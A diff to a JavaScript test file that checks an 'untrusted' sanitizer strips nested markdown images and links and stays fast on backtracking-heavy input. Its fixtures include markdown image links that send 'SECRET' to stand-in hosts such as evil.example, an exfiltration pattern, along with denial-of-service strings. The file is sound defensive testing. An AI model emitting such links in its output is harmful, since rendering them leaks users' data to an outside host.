@@ -14,6 +14,23 @@ describe('untrusted', () => {
     expect(untrusted(null)).toBe('');
   });
 
+  it('leaves no image or link behind when they are nested, and cleaning twice changes nothing', () => {
+    const markdownLink = /!?\[[^\]]*\]\(/;
+    for (const hostile of [
+      '[![x](a)](https://evil.example/p.png?d=SECRET)',
+      '[![](x)](https://evil/q)',
+      'before [![x](a)](https://evil.example/p.png?d=SECRET) after',
+      '[[[a](b)](c)](https://evil/deep)',
+      '<[a](x)b>[![](y)](https://evil/r)',
+    ]) {
+      const once = untrusted(hostile);
+      expect(once, hostile).not.toMatch(markdownLink);
+      expect(once, hostile).not.toContain('evil');
+      expect(untrusted(once), hostile).toBe(once);
+    }
+    expect(untrusted('before [![x](a)](https://evil.example/p.png?d=SECRET) after')).toBe('before after');
+  });
+
   it('caps the length with an ellipsis', () => {
     const out = untrusted('x'.repeat(1000), 50);
     expect(out).toHaveLength(50);
@@ -22,7 +39,7 @@ describe('untrusted', () => {
 
   it('stays fast on input built to make a backtracking pattern slow', () => {
     const started = Date.now();
-    for (const hostile of ['['.repeat(100_000), '<'.repeat(100_000), '[a]('.repeat(30_000), '!['.repeat(50_000)]) {
+    for (const hostile of ['['.repeat(100_000), '<'.repeat(100_000), '[a]('.repeat(30_000), '!['.repeat(50_000), `${'[!['.repeat(30_000)}x${'](a)](b)'.repeat(30_000)}`]) {
       untrusted(hostile, 500);
     }
     expect(Date.now() - started).toBeLessThan(500);
